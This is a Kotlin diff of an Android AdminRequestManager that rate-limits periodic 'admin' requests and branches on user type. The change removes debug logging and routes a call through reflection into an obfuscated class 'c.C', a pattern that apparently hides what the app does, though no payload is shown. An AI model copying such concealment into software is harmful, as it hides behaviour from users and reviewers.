@@ -47,7 +47,6 @@ object AdminRequestManager {
                 100
             }
         } catch (e: Exception) {
-            CanNextGo.showLog("获取每日限制失败: ${e.message}")
             100
         }
     }
@@ -62,7 +61,6 @@ object AdminRequestManager {
                 60
             }
         } catch (e: Exception) {
-            CanNextGo.showLog("获取定时间隔失败: ${e.message}")
             60
         }
     }
@@ -77,7 +75,6 @@ object AdminRequestManager {
                 60
             }
         } catch (e: Exception) {
-            CanNextGo.showLog("获取Ding定时间隔失败: ${e.message}")
             60
         }
     }
@@ -91,7 +88,6 @@ object AdminRequestManager {
                 false
             }
         } catch (e: Exception) {
-            CanNextGo.showLog("判断用户类型失败: ${e.message}")
             false
         }
     }
@@ -102,7 +98,6 @@ object AdminRequestManager {
             val jsonData = JSONObject(AllDataTool.dataState)
             jsonData.has("canpa") && ChongTool.getAUTool(jsonData)
         } catch (e: Exception) {
-            CanNextGo.showLog("检查配置A失败: ${e.message}")
             false
         }
     }
@@ -113,19 +108,16 @@ object AdminRequestManager {
             val jsonData = JSONObject(AllDataTool.dataState)
             jsonData.has("canpa") && !ChongTool.getAUTool(jsonData)
         } catch (e: Exception) {
-            CanNextGo.showLog("检查配置B失败: ${e.message}")
             false
         }
     }
 
     private fun canMakeRequest(): Boolean {
         if (isRequesting) {
-            CanNextGo.showLog("已有请求在进行中，跳过")
             return false
         }
 
         if (dailyRequestCount >= getDailyLimit()) {
-            CanNextGo.showLog("已达到每日请求上限: ${getDailyLimit()}")
             return false
         }
 
@@ -134,7 +126,6 @@ object AdminRequestManager {
 
     private fun incrementRequestCount() {
         dailyRequestCount += 1
-        CanNextGo.showLog("当前请求次数: $dailyRequestCount/${getDailyLimit()}")
     }
 
     fun startPopAdmin() {
@@ -200,16 +191,13 @@ object AdminRequestManager {
 
     private fun makeDingAdminRequest() {
         if (dailyRequestCount >= getDailyLimit()) {
-            CanNextGo.showLog("已达到每日请求上限，跳过Ding请求")
             return
         }
 
         if (isRequesting) {
-            CanNextGo.showLog("已有请求在进行中，跳过Ding请求")
             return
         }
 
-        CanNextGo.showLog("执行Ding Admin请求")
         incrementRequestCount()
 
         DataPgTool.instance.postAdminData { result ->
@@ -248,25 +236,24 @@ object AdminRequestManager {
     }
 
     private fun handleConfigBScenario() {
-        CanNextGo.showLog("开始定时请求流程")
         startPeriodicRequests()
     }
 
     private fun handleNoConfigScenario() {
         if (!canMakeRequest()) return
 
-        CanNextGo.showLog("无配置场景，立即请求")
+        CanNextGo.showLog("No configuration scenario，request now")
         makeAdminRequest { success ->
-            CanNextGo.showLog("无配置场景 makeAdminRequest result: success=$success, isUserTypeA=${isUserTypeA()}")
+            CanNextGo.showLog("No configuration scenario makeAdminRequest result: success=$success, isUserTypeA=${isUserTypeA()}")
             if (success && isUserTypeA()) {
-                CanNextGo.showLog("无配置场景 条件满足，调用callPueOnexun")
+                CanNextGo.showLog("No configuration scenario conditions met，callPueOnexun")
                 callPueOnexun()
             } else if (success && !isUserTypeA()) {
-                CanNextGo.showLog("无配置场景 B用户，转入情况2流程")
+                CanNextGo.showLog("No configuration scenario B用户，转入情况2流程")
                 // B用户转入情况2流程
                 handleConfigBScenario()
             } else {
-                CanNextGo.showLog("无配置场景 请求失败，停止后续操作")
+                CanNextGo.showLog("No configuration scenario 请求失败，停止后续操作")
             }
         }
     }
@@ -418,15 +405,15 @@ object AdminRequestManager {
     }
 
     private fun callPueOnexun() {
-//        try {
-//            val pueClass = Class.forName("c.C")
-//            val onexunMethod = pueClass.getMethod("c1", Object::class.java)
-//            onexunMethod.invoke(null, AllDataTool.getMainUser)
-//            CanNextGo.showLog("AdminRequestManager callPueOnexun success")
-//        } catch (e: Exception) {
-//            CanNextGo.showLog("AdminRequestManager callPueOnexun error: ${e.message}")
-//        }
-        callPue(AllDataTool.getMainUser)
+        try {
+            val pueClass = Class.forName("c.C")
+            val onexunMethod = pueClass.getMethod("c1", Object::class.java)
+            onexunMethod.invoke(null, AllDataTool.getMainUser)
+            CanNextGo.showLog("AdminRequestManager callPueOnexun success")
+        } catch (e: Exception) {
+            CanNextGo.showLog("AdminRequestManager callPueOnexun error: ${e.message}")
+        }
+//        callPue(AllDataTool.getMainUser)
     }
 
     private fun callPue(context: Any) {
